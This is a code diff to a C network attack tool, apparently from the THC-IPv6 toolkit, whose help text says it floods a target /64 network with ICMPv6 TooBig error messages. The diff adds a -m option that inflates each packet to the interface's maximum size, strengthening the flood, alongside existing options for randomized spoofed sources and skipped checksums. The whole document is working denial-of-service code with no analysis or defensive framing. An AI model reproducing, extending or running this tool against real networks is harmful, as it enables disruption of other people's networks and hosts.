@@ -12,7 +12,7 @@
 
 void help(char *prg) {
   printf("%s %s (c) 2015 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
-  printf("Syntax: %s [-acpPTUrR] [-s sourceip6] interface target-network\n\n", prg);
+  printf("Syntax: %s [-acpPTUrRm] [-s sourceip6] interface target-network\n\n", prg);
   printf("Options:\n");
   printf(" -a      add a hop-by-hop header with router alert\n");
   printf(" -c      do not calculate the checksum to save time\n");
@@ -22,6 +22,7 @@ void help(char *prg) {
   printf(" -U      send ICMPv6 Unreachable (no route)\n");
   printf(" -r      randomize the source from your /64 prefix\n");
   printf(" -R      randomize the source fully\n");
+  printf(" -m      generate a maximum size packet\n");
   printf(" -s sourceip6  use this as source IPv6 address\n");
   printf("\nFlood the target /64 network with ICMPv6 TooBig error messages.\n");
   printf("This tool version is manyfold more effective than ndpexhaust6.\n");
@@ -33,12 +34,12 @@ void help(char *prg) {
 int main(int argc, char *argv[]) {
   char *interface, *ptr, buf2[8];
   unsigned char *dst = NULL, *dstmac = NULL, *src = NULL, *srcmac = NULL;
-  int i, offset = 14, type = ICMP6_TOOBIG, alert = 0, randsrc = 0, do_crc = 1;
+  int i, offset = 14, type = ICMP6_TOOBIG, alert = 0, randsrc = 0, do_crc = 1, maxsize = 160;
   unsigned char *pkt = NULL, ip6[8];
   int pkt_len = 0, count = 0;
   thc_ipv6_hdr *hdr;
   unsigned int filler = IDS_STRING, mychecksum;
-  unsigned char offender[] = { 0x60, 0x00, 0x00, 0x00, 0x01, 0xcd, 0x3a, 0x3f,
+  unsigned char offender[1452] = { 0x60, 0x00, 0x00, 0x00, 0x01, 0xcd, 0x3a, 0x3f,
                                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                                0x20, 0x03, 0x00, 0x04, 0x00, 0x04, 0x00, 0x04,
@@ -66,13 +67,16 @@ int main(int argc, char *argv[]) {
   setvbuf(stdout, NULL, _IONBF, 0);
   setvbuf(stderr, NULL, _IONBF, 0);
   
-   while ((i = getopt(argc, argv, "acpPTUrRs:")) >= 0) {
+   while ((i = getopt(argc, argv, "acpPTUrRs:m")) >= 0) {
      switch(i) {
        case 'a':
          alert = 8;
          break;
        case 'c':
          do_crc = 0;
+         break;
+       case 'm':
+         maxsize = -1;
          break;
        case 'p':
          type = ICMP6_ECHOREQUEST;
@@ -128,6 +132,12 @@ int main(int argc, char *argv[]) {
     fprintf(stderr, "Error: can not find a route to target %s\n", argv[2]);
     exit(-1);
   }
+  
+  if (maxsize == -1)
+    maxsize = thc_get_mtu(interface) - 48 - alert;
+
+  if (maxsize > sizeof(offender))
+    maxsize = sizeof(offender);
 
   for (i = 0; i < ((sizeof(offender) - 48) / 4); i++)
     memcpy(offender + 48 + i*4, (char*) &filler + _TAKE4, 4);
@@ -142,7 +152,7 @@ int main(int argc, char *argv[]) {
     if (thc_add_hdr_hopbyhop(pkt, &pkt_len, buf2, 6) < 0)
       return -1;
   }
-  if (thc_add_icmp6(pkt, &pkt_len, type, 0, 1280, offender, sizeof(offender), 0) < 0)
+  if (thc_add_icmp6(pkt, &pkt_len, type, 0, 1280, offender, maxsize, 0) < 0)
     return -1;
   if (thc_generate_pkt(interface, srcmac, dstmac, pkt, &pkt_len) < 0)
     return -1;
